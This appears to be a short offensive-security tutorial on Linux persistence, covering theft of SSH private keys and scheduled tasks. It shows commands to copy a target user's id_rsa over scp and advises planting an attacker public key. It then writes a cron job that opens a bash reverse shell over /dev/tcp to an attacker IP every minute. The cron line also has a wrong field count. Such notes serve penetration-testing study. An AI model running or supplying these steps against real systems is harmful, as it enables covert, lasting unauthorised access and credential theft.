
## Linux Persistence

### 01.Persistence Using SSH Keys

Because in a corporate environment Linux is used as a server system to host web apps databases etc,, they are accesed remotly by servicess or protocols like SSH. On a Linux system you can log in with a password or a private key.   A private key is like a master key to the system.

If we have the username and password, we can log in by SSH.

```plaintext
ssh accountname@10.10.10.10

(password): 
```

Find if any private key is available on the target computer.

```plaintext
cd .ssh/
```

The private key is **id\_rsa**

The public key is **id\_rsa.pub**

Copy id\_rsa private key to our system via SSH.

```plaintext
scp accountname@10.10.10.10:~/.ssh/id_rsa .

(password):
```

After the file is downloaded to our system, we need to change its permissions.

```plaintext
chmod 400 id_rsa
```

Login with using the private key:

```plaintext
ssh -i id_rsa student@10.10.10.10
```

_**A better way of maintaining persistence via SSH key is to generate key pairs on your system, transfer the public key to the target  in the home directory  of the user  in .SSH directory and keep the private key.**_


### 02.Persistence using Cron Jobs

Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule. An application or script that is configured to run repeatedly is known as a Cron job.

 **Cron Job Anatomy from left to right**

_min (0-59)_

_hour (0-23)_

_day of the month (1-31)_

_month (1-12)_

_day of the week (1-7)_

_“\*"  means it will run every minute, day etc._

\# Example of job definition:  
\# .---------------- minute (0 - 59)  
\# |  .------------- hour (0 - 23)  
\# |  |  .---------- day of month (1 - 31)  
\# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...  
\# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat  
\# |  |  |  |  |  
\# \*  \*  \*  \*  \* user-name command to be executed  
17 \*    \* \* \*   root    cd / && run-parts --report /etc/cron.hourly  
25 6    \* \* \*   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }  
47 6    \* \* 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }  
52 6    1 \* \*   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }  
 

Enumerate cron jobs

```plaintext
cat /etc/cron*
```

**To create a cron job we need to cron file and add the cronfile to the cron tab file.**

Creating the cron file

```plaintext
echo “*  *  *  *  /bin/bash -c ‘bash -i >& /dev/tcp/10.10.10.9(your ip address)/4444(ncat listening port) 0>&1’ ” > cron
cat cron
```

Add this cron job

```plaintext
crontab -i cron
```

View list of cron jobs

```plaintext
crontab -l
```
